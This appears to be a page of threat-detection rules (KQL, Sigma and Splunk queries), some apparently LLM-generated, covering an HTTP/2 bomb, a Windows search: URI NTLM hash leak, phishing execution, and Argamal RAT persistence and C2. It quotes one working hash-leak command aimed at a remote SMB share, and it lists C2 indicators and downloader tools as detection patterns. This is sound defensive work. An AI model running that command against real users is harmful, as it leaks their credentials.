    | where ReqCount > 300 and AvgCsBytes < 500 and MaxTimeTaken > 10000
    | extend Source="IIS";
let WAFsig = CommonSecurityLog

    | where ReqCount > 200 and TotalRecvBytes < 200000 and DistinctSrcPorts > 25
    | extend Source="WAF";
union IISsig, WAFsig
| order by TimeGenerated desc

[LLM] Web server process OOM/crash-restart cycle (HTTP/2 Bomb impact) Actions on Objectives Medium
Detects the downstream impact of HTTP/2 Bomb: nginx/httpd/w3wp/envoy worker processes repeatedly crashing and being restarted by services.exe/WerFault.exe within a short window, consistent with memory exhaustion (the article notes ~32 GB pinned in 20s on Apache/Envoy). Catches the attack from the endpoint side when perimeter telemetry is missing. Rationale: The article specifies that a single client can pin 32 GB of memory on Apache HTTPD and Envoy in ~20 seconds, leading to worker exhaustion / OOM kills. On Windows hosts and Linux hosts forwarding to Defender via MDE-for-Linux, the post-OOM symptom is a tight cluster of service-manager-initiated restarts of the web-server binary — far more frequent than any normal config-reload cadence. Cross-checked with the Calif disclosure where the PoC explicitly demonstrates 20s-to-OOM behaviour. Cross-checked against: • https://blog.calif.io/p/codex-discovered-a-hidden-http2-bomb • https://cybersecuritynews.com/http-2-bomb-remote-dos-exploit/
ATT&CKT1499.003 T1499.004
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(24h)
| where FileName in~ ("nginx.exe","httpd.exe","w3wp.exe","envoy.exe","pingora.exe")
| where InitiatingProcessFileName in~ ("services.exe","WerFault.exe","svchost.exe")
| summarize Restarts=count(), FirstRestart=min(Timestamp), LastRestart=max(Timestamp), Parents=make_set(InitiatingProcessFileName) by DeviceName, FileName, bin(Timestamp, 30m)
| where Restarts >= 4
| extend WindowMin = datetime_diff('minute', LastRestart, FirstRestart)
| order by Restarts desc
let win = 30m;
let ProcRestarts = SecurityEvent
    | where TimeGenerated > ago(24h)
    | where EventID == 4688
    | extend img = tolower(tostring(split(NewProcessName, "\\")[-1]))
    | extend parent = tolower(tostring(split(ParentProcessName, "\\")[-1]))
    | where img in ("nginx.exe","httpd.exe","w3wp.exe","envoy.exe","pingora.exe")
    | where parent in ("services.exe","werfault.exe","svchost.exe")
    | summarize Restarts=count(), FirstRestart=min(TimeGenerated), LastRestart=max(TimeGenerated) by Computer, img, bin(TimeGenerated, win)
    | where Restarts >= 4;
let SvcCrashes = Event
    | where TimeGenerated > ago(24h)
    | where EventLog == "System" and EventID == 7034
    | where ParameterXml has_any ("nginx","httpd","Apache","W3SVC","envoy","pingora")
    | summarize Crashes=count(), LastCrash=max(TimeGenerated) by Computer, bin(TimeGenerated, win);
ProcRestarts | join kind=leftouter SvcCrashes on Computer | order by Restarts desc

[LLM] Windows Search URI NTLMv2 hash leak via search:crumb=location UNC handler Delivery High
Hunts the unpatched Windows search: URI abuse described in the article title: a search: URI carrying crumb=location:\\<attacker>\share is invoked (via cmd.exe `start`, shortcut, malicious HTML, or Office doc), causing the Search shell handler to reach the attacker's SMB share and leak the user's NTLMv2 hash before any error dialog renders. Anchor strings from the article code block: `search:query=` paired with `crumb=location:\\`. Rationale: Exact-string anchor from the article's code block: `start "" "search:query=test&crumb=location:\\10.0.1.100\share"`. The pair `search:` + `crumb=location:` together is the specific abuse pattern — neither token alone triggers the SMB fetch. Cross-checked with Huntress's deeper write-up confirming the handler resolves crumb=location even when filePath is absent, which is what makes this the NTLMv2-leak variant of CVE-2026-33829. Endpoint side is high-fidelity because no Microsoft-shipped tooling uses this combination. Cross-checked against: • https://www.huntress.com/blog/unpatched-ntlm-leak-windows-search-uri-handler • https://thehackernews.com/2026/06/unpatched-windows-search-uri.html
ATT&CKT1187 T1557.001 T1204.001
Data sourcesEndpoint.Processes Network_Traffic.All_Traffic
let SearchUriCmd = DeviceProcessEvents
    | where Timestamp > ago(7d)
    | where ProcessCommandLine has "search:" and ProcessCommandLine has "crumb=location:"
    | where AccountName !endswith "$"
    | project Timestamp, DeviceName, AccountName, FileName, InitiatingProcessFileName, ProcessCommandLine, ReportId;
let SuspectSmbEgress = DeviceNetworkEvents
    | where Timestamp > ago(7d)
    | where RemotePort in (445, 139)
    | where RemoteIPType == "Public"
    | where InitiatingProcessFileName in~ ("explorer.exe","SearchApp.exe","SearchIndexer.exe","SearchHost.exe","SearchProtocolHost.exe","msedge.exe","chrome.exe","firefox.exe","outlook.exe","winword.exe","excel.exe")
    | project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, RemoteIP, RemotePort;
union SearchUriCmd, SuspectSmbEgress
| order by Timestamp desc
let CmdHits = SecurityEvent
    | where TimeGenerated > ago(7d)
    | where EventID == 4688
    | where CommandLine has "search:" and CommandLine has "crumb=location:"
    | where SubjectUserName !endswith "$"
    | project TimeGenerated, Computer, SubjectUserName, NewProcessName, ParentProcessName, CommandLine;
let SmbEgress = CommonSecurityLog
    | where TimeGenerated > ago(7d)
    | where DestinationPort in (445, 139)
    | where DeviceAction !in ("deny","block","drop")
    | where not(ipv4_is_private(DestinationIP))
    | project TimeGenerated, Computer=DeviceName, SourceIP, DestinationIP, DestinationPort, ProcessName=SourceProcessName;
union CmdHits, SmbEgress
| order by TimeGenerated desc

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: Office Application Spawning Script Host

OAuth consent / suspicious app grant Actions on Objectives High
Cloud identity abuse: app gets high-priv scopes, often via consent phishing.
ATT&CKT1528 T1098.001
Data sourcesAuthentication.Authentication CloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)
| where ActionType in ("Consent to application.","Add OAuth2PermissionGrant.","Add delegated permission grant.")
| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,
          ActivityObjects, IPAddress, UserAgent
// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has "Consent to application"
| where Result =~ "success"
| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),
         AppId   = tostring(parse_json(tostring(TargetResources))[0].id),
         User    = tostring(parse_json(tostring(InitiatedBy)).user.userPrincipalName)
| project TimeGenerated, OperationName, User, AppName, AppId, Result
| order by TimeGenerated desc

Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
[LLM] Argamal COM Hijack of Windows Color System Calibration Loader CLSID Installation High
Detects HKCU CLSID hijack of the Windows Color System Calibration Loader {B210D694-C8DF-490D-9576-9E20CDBC20BD} or the Stage1 staging CLSID {722D0F89-B69C-4700-AE8C-4A44350E4876} where InprocServer32 / ShellFolder points to a DLL in AppData\Local. This is Argamal's login-trigger persistence anchor. Rationale: Anchored on the two exact CLSIDs from the article ({B210D694-...} Calibration Loader and {722D0F89-...} Stage1 staging) plus the HKCU AppData\Local InprocServer32 payload location — the combination is article-specific and not produced by any legitimate Color System software (which writes HKLM).
ATT&CKT1546.015 T1112
Data sourcesEndpoint.Registry
DeviceRegistryEvents
| where Timestamp > ago(7d)
| where ActionType in ("RegistryValueSet","RegistryKeyCreated")
| where RegistryKey has_any ("{B210D694-C8DF-490D-9576-9E20CDBC20BD}","{722D0F89-B69C-4700-AE8C-4A44350E4876}")
| where RegistryKey has "InprocServer32" or RegistryValueName =~ "ShellFolder"
| where RegistryValueData has "AppData\\Local" and RegistryValueData endswith ".dll"
| project Timestamp, DeviceName, InitiatingProcessAccountName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp desc
ImRegistryEvent
| where TimeGenerated > ago(7d)
| where RegistryKey has_any ("{B210D694-C8DF-490D-9576-9E20CDBC20BD}","{722D0F89-B69C-4700-AE8C-4A44350E4876}")
| where (RegistryKey has "InprocServer32") or (RegistryValue =~ "ShellFolder")
| where RegistryValueData has "AppData\\Local" and RegistryValueData endswith ".dll"
| project TimeGenerated, DvcHostname, ActorUsername, RegistryKey, RegistryValue, RegistryValueData, ActingProcessName, ActingProcessCommandLine

[LLM] Argamal MI_V / MI_V2 Environment Variable Stage Handoff Installation High
Detects creation of the HKCU\Environment\MI_V or MI_V2 value used by Argamal Stage1 PowerShell to hand off the Base64-encoded Stage2 payload to a delayed scheduled task. The variable name is unique to this family. Rationale: MI_V / MI_V2 is a unique-to-Argamal env-var name documented in the Securelist write-up as the Stage1→Stage2 handoff. Anchored on the exact HKCU\Environment subkey + literal value names — no legitimate software writes these names.
ATT&CKT1140 T1546.015 T1027.013
Data sourcesEndpoint.Registry
DeviceRegistryEvents
| where Timestamp > ago(30d)
| where ActionType == "RegistryValueSet"
| where RegistryKey endswith "\\Environment"
| where RegistryValueName in~ ("MI_V","MI_V2")
| extend ValueLen = strlen(tostring(RegistryValueData))
| project Timestamp, DeviceName, InitiatingProcessAccountName, RegistryKey, RegistryValueName, ValueLen, RegistryValueDataPreview = substring(tostring(RegistryValueData),0,160), InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
ImRegistryEvent
| where TimeGenerated > ago(30d)
| where RegistryKey endswith "\\Environment"
| where RegistryValue in~ ("MI_V","MI_V2")
| extend ValueLen = strlen(tostring(RegistryValueData))
| project TimeGenerated, DvcHostname, ActorUsername, RegistryKey, RegistryValue, ValueLen, ActingProcessName, ActingProcessCommandLine

[LLM] Argamal Stage2 BITSAdmin Pull of zaesdl.dat from GitHub Command & Control High
Detects bitsadmin.exe invoked with /transfer (or /addfile + /resume) downloading the AES-encrypted RAT payload named zaesdl.dat — Argamal's Stage2 retrieval pattern using GitHub-hosted infrastructure. Rationale: Anchored on the exact payload filename (zaesdl.dat) and Argamal's documented use of GitHub-hosted Stage2 retrieved via bitsadmin. The combination of bitsadmin + github + .dat extension is extremely uncommon outside this family.
ATT&CKT1105 T1197 T1071.001
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName =~ "bitsadmin.exe"
| where ProcessCommandLine has_any ("/transfer","/addfile","/create","/resume")
| where ProcessCommandLine has_any ("zaesdl.dat","raw.githubusercontent.com","github.com","gist.githubusercontent.com")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessParentFileName, InitiatingProcessCommandLine, FolderPath
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where NewProcessName endswith "\\bitsadmin.exe"
| where CommandLine has_any ("/transfer","/addfile","/create","/resume")
| where CommandLine has_any ("zaesdl.dat","raw.githubusercontent.com","github.com","gist.githubusercontent.com")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName

[LLM] Argamal RAT C2 Beacon — 186.158.223.35 / freeddns / kozow / ignorelist / UDP-57441 / TCP-3747 Command & Control High
Detects connections to the Argamal RAT C2 infrastructure: hardcoded IP 186.158.223.35, the three dyndns FQDNs (asper1.freeddns.org, winst0.kozow.com, country1.ignorelist.com), and the malware's unusual UDP/57441 heartbeat / TCP/3747 extended-mode / UDP/63559 payload-update ports. Rationale: Hardcoded IP 186.158.223.35 plus three named dyndns FQDNs and the three unusual ports (UDP/57441 heartbeat, TCP/3747 extended-mode, UDP/63559 payload-update) are pulled verbatim from the Securelist IOC section. The port-only branch is gated by AppData\Local origin to suppress unrelated egress.
ATT&CKT1071.001 T1095 T1568.002 T1571
Data sourcesNetwork_Traffic.All_Traffic
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where (RemoteIP == "186.158.223.35")
    or (RemoteUrl in~ ("asper1.freeddns.org","winst0.kozow.com","country1.ignorelist.com"))
    or (RemotePort in (57441,3747,63559) and InitiatingProcessFolderPath has "AppData\\Local")
| project Timestamp, DeviceName, RemoteIP, RemotePort, Protocol, RemoteUrl, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
ImNetworkSession
| where TimeGenerated > ago(30d)
| where (DstIpAddr == "186.158.223.35")
    or (DstHostname in~ ("asper1.freeddns.org","winst0.kozow.com","country1.ignorelist.com"))
    or (DstPortNumber in (57441,3747,63559))
| project TimeGenerated, DvcHostname, SrcIpAddr, DstIpAddr, DstHostname, DstPortNumber, NetworkProtocol, NetworkBytes

[LLM] Argamal Scheduled Task Pointing at AppData\Local DLL via Color System Calibration Loader Installation Medium
Detects scheduled task creation/modification where the Argamal Stage1 PowerShell registers a delayed (3-day) trigger or repurposes the \Microsoft\Windows\WindowsColorSystem\Calibration Loader task to launch a random-named DLL from %USER%\AppData\Local. Catches the persistence and the delayed-detonation primitives in one shot. Rationale: References the exact task path \Microsoft\Windows\WindowsColorSystem\Calibration Loader, the MI_V env-var fed to Stage2, and the AppData\Local DLL target — all article-specific. Catches both the 3-day-delayed task primitive and the recurring login-trigger task in one rule.
ATT&CKT1053.005 T1546.015 T1059.001
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("schtasks.exe","powershell.exe","pwsh.exe")
| where ProcessCommandLine has_any ("/create","/change","Register-ScheduledTask","New-ScheduledTask")
| where ProcessCommandLine has_any ("Calibration Loader","WindowsColorSystem","MI_V")
   or (ProcessCommandLine has "AppData\\Local" and ProcessCommandLine has ".dll" and ProcessCommandLine has_any ("rundll32","regsvr32","-Command","-EncodedCommand"))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessParentFileName, InitiatingProcessFolderPath
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith_cs "\\schtasks.exe" or NewProcessName endswith_cs "\\powershell.exe" or NewProcessName endswith_cs "\\pwsh.exe"
| where CommandLine has_any ("/create","/change","Register-ScheduledTask","New-ScheduledTask")
| where CommandLine has_any ("Calibration Loader","WindowsColorSystem","MI_V")
   or (CommandLine has "AppData\\Local" and CommandLine has ".dll")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName

[LLM] Argamal Loader Artifacts — natives2_blob.bin / Modified ffmpeg.dll IOC Sweep Installation High
Detects the Argamal loader files on disk: the natives2_blob.bin script-executor DLL by filename, the known modified ffmpeg.dll by SHA1 (42add9475e67a1ccc6a6af94b5475d3defc01b85), and the script-executor DLL by SHA1 (edce72f59e4c1d136cd1946af70d334c19df858d). Triggers on file write, file open, or image load. Rationale: Hash IOC sweep + named-artifact hunt. The filename natives2_blob.bin is unique to Argamal (does not appear in any legitimate ffmpeg / game shipment) and the two SHA1s are confirmed-malicious per the Kaspersky write-up. Union across DeviceFileEvents and DeviceImageLoadEvents catches both the drop and the load.
ATT&CKT1574.001 T1204.002 T1195.002
Data sourcesEndpoint.Filesystem
union
  (DeviceFileEvents | where Timestamp > ago(90d) | where FileName =~ "natives2_blob.bin" or SHA1 in~ ("42add9475e67a1ccc6a6af94b5475d3defc01b85","edce72f59e4c1d136cd1946af70d334c19df858d") | project Timestamp, DeviceName, Source="FileEvent", ActionType, FolderPath, FileName, SHA1, FileOriginUrl, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine),
  (DeviceImageLoadEvents | where Timestamp > ago(90d) | where FileName =~ "ffmpeg.dll" and SHA1 == "42add9475e67a1ccc6a6af94b5475d3defc01b85" | project Timestamp, DeviceName, Source="ImageLoad", ActionType, FolderPath, FileName, SHA1, FileOriginUrl="", InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine),
  (DeviceImageLoadEvents | where Timestamp > ago(90d) | where SHA1 == "edce72f59e4c1d136cd1946af70d334c19df858d" | project Timestamp, DeviceName, Source="ImageLoad", ActionType, FolderPath, FileName, SHA1, FileOriginUrl="", InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine)
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(90d)
| where TargetFileName =~ "natives2_blob.bin"
    or TargetFileSHA1 in~ ("42add9475e67a1ccc6a6af94b5475d3defc01b85","edce72f59e4c1d136cd1946af70d334c19df858d")
| project TimeGenerated, DvcHostname, ActorUsername, EventType, TargetFilePath, TargetFileName, TargetFileSHA1, ActingProcessName, ActingProcessCommandLine
title: Argamal Loader File Write (natives2_blob.bin / known ffmpeg.dll SHA1)
id: 8b1ee0c8-9c1f-4e22-9b1a-1f6c1f9e9c06
description: Detects Argamal loader artifacts on disk by filename (natives2_blob.bin) or by SHA1 of the modified ffmpeg.dll / Stage1 script-executor DLL.
references:
  - https://securelist.com/argamal-rat-distributed-with-hentai-games/119999/
author: SOC
date: 2026/06/03
tags:
  - attack.execution
  - attack.persistence
  - attack.t1574.001
  - attack.t1204.002
logsource:
  category: file_event
  product: windows
detection:
  by_name:
    TargetFilename|endswith: '\natives2_blob.bin'
  by_hash:
    Hashes|contains:
      - '42add9475e67a1ccc6a6af94b5475d3defc01b85'
      - 'edce72f59e4c1d136cd1946af70d334c19df858d'
  condition: by_name or by_hash
level: high
source:windows.sysmon (@EventID:11 OR @EventID:7 OR @EventID:1) (@TargetFilename:(*\\natives2_blob.bin OR *\\Natives2_Blob.bin) OR @Hashes:(*42add9475e67a1ccc6a6af94b5475d3defc01b85* OR *edce72f59e4c1d136cd1946af70d334c19df858d*) OR @ImageLoaded:(*\\natives2_blob.bin OR *\\Natives2_Blob.bin))
#event_simpleName=FileWritten
| TargetFileName=/\\natives2_blob\.bin$/i
| groupBy([aid, ComputerName, TargetFileName, ContextImageFileName, ContextProcessId], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=t count min(_time) as firstTime max(_time) as lastTime values(Filesystem.file_path) as path values(Filesystem.process_name) as proc from datamodel=Endpoint.Filesystem where (Filesystem.file_name="natives2_blob.bin" OR Filesystem.file_hash IN ("42add9475e67a1ccc6a6af94b5475d3defc01b85","edce72f59e4c1d136cd1946af70d334c19df858d")) by Filesystem.dest Filesystem.user Filesystem.file_name Filesystem.file_hash 
| `drop_dm_object_name(Filesystem)` 
| convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Filesystem.file_path) as path values(Filesystem.process_name) as proc from datamodel=Endpoint.Filesystem where (Filesystem.file_name="natives2_blob.bin" OR Filesystem.file_hash IN ("42add9475e67a1ccc6a6af94b5475d3defc01b85","edce72f59e4c1d136cd1946af70d334c19df858d")) by Filesystem.dest Filesystem.user Filesystem.file_name Filesystem.file_hash 
| `drop_dm_object_name(Filesystem)` 
| convert ctime(firstTime) ctime(lastTime)
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.
ATT&CKT1071
Data sourcesNetwork_Traffic.All_Traffic Web Network_Resolution.DNS DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("186.158.223.35") or RemoteUrl has_any ("asper1.freeddns.org", "winst0.kozow.com", "country1.ignorelist.com")
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine

ImNetworkSession

Scheduled task created with suspicious image / encoded args Installation High
schtasks.exe /create or Microsoft-Windows-TaskScheduler EventID 4698 with LOLBin actions.
ATT&CKT1053.005
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName =~ "schtasks.exe"
| where ProcessCommandLine has "/create"
| where ProcessCommandLine has_any ("powershell","cmd.exe","rundll32","-enc","FromBase64","\Users\Public","\AppData\")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where NewProcessName endswith "\schtasks.exe"
| where CommandLine has "/create"
| where CommandLine has_any ("powershell","cmd.exe","rundll32","-enc","FromBase64",
                              "\Users\Public", "\AppData\")
| project TimeGenerated, Computer, Account, CommandLine,
          ParentProcessName, NewProcessName
| order by TimeGenerated desc

title: Scheduled Task Creation with Suspicious Image / Encoded Args
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0d
status: experimental
description: |
    schtasks.exe /create with payload-shaped action — points at
    powershell, cmd, rundll32, encoded-base64, or user-writable paths.
references:
    - https://attack.mitre.org/techniques/T1053/005/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1053.005
    - attack.persistence
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_schtasks:
        Image|endswith: '\schtasks.exe'
